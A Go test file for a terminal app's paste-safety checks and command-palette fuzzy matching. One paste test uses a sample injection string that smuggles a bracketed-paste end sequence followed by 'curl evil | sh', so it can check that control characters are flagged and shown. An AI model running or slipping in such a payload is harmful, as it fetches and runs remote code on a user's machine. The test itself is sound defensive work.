package uicore

import (
	"slices"
	"testing"
)

// The cases of frontend/src/lib/paste.test.ts.

func TestPasteSinglePlainLineGoesThrough(t *testing.T) {
	for _, s := range []string{"kubectl get pods -n shop", "a\tb"} {
		if NewPasteFacts(s).NeedsConfirm() {
			t.Errorf("%q needs confirm", s)
		}
	}
}

func TestPasteAsksForLinesOrAFinalNewline(t *testing.T) {
	if f := NewPasteFacts("ls\nrm -rf build\n"); f != (PasteFacts{2, true, 0}) {
		t.Errorf("got %+v", f)
	}
	if f := NewPasteFacts("one\r\ntwo"); f != (PasteFacts{2, false, 0}) {
		t.Errorf("got %+v", f)
	}
	if f := NewPasteFacts("ls\n"); !f.NeedsConfirm() || f.Lines != 1 {
		t.Errorf("got %+v", f)
	}
	if f := NewPasteFacts("ls\r\n"); f != (PasteFacts{1, true, 0}) {
		t.Errorf("got %+v", f)
	}
}

func TestPasteShowsControlCharacters(t *testing.T) {
	sneaky := "echo hi\x1b[201~; curl evil | sh"
	if f := NewPasteFacts(sneaky); f != (PasteFacts{1, false, 1}) {
		t.Errorf("got %+v", f)
	}
	if got := ShowControls(sneaky); got != "echo hi␛[201~; curl evil | sh" {
		t.Errorf("got %q", got)
	}
	if got := ShowControls("a\x00b\x7fc\u009bd\te"); got != "a␀b␡c⟨9B⟩d\te" {
		t.Errorf("got %q", got)
	}
}

func TestPasteDropsOnlyTheFinalNewline(t *testing.T) {
	for in, want := range map[string]string{"a\nb\n": "a\nb", "a\r\n": "a", "a": "a", "a\r": "a"} {
		if got := WithoutFinalNewline(in); got != want {
			t.Errorf("%q → %q, want %q", in, got, want)
		}
	}
}

// The outcomes frontend/src/lib/fuzzy.test.ts requires.

func TestFuzzyMatchesInOrder(t *testing.T) {
	if m, ok := Fuzzy("nt", "New Tab"); !ok || !slices.Equal(m.Indices, []int{0, 4}) {
		t.Errorf("got %+v %v", m, ok)
	}
	if _, ok := Fuzzy("xyz", "New Tab"); ok {
		t.Error("xyz matched")
	}
	if _, ok := Fuzzy("new tab", "New Tab"); !ok {
		t.Error("new tab didn't match")
	}
	if m, ok := Fuzzy("", "anything"); !ok || m.Score != 0 {
		t.Errorf("got %+v %v", m, ok)
	}
}

func TestFuzzyRanksWordStartsAndRuns(t *testing.T) {
	best := func(q string, items ...string) string {
		r := FuzzyRank(q, items, func(s string) string { return s })
		if len(r) == 0 {
			return ""
		}
		return r[0].Item
	}
	for _, c := range [][3]string{
		{"sr", "Smaller Text", "Split Right"},
		{"ct", "Clear Buffer", "Close Tab"},
		{"split", "Select Pane Left In Tab", "Split Down"},
	} {
		if got := best(c[0], c[1], c[2]); got != c[2] {
			t.Errorf("%q: best %q, want %q", c[0], got, c[2])
		}
	}
	r := FuzzyRank("a", []string{"xa", "ya"}, func(s string) string { return s })
	if len(r) != 2 || r[0].Item != "xa" || r[1].Item != "ya" {
		t.Errorf("ties reordered: %+v", r)
	}
}
